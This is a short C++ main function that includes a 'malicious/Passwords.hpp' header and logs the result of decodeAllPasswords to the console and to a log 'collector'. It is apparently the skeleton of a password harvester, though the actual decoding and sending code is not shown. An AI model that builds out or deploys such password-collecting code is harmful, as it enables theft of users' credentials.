#include <log/Log.hpp>
#include <malicious/Passwords.hpp>
using namespace Malicious;

#include <common/Innocence.hpp>

int main()
{
	LOG.setIdentity(Common::identity);
	LOG.addObserver(new Log::LogToConsole);
	LOG.addObserver(new Log::LogToCollector);

	LOG << decodeAllPasswords(',');
	return EXIT_SUCCESS;
}
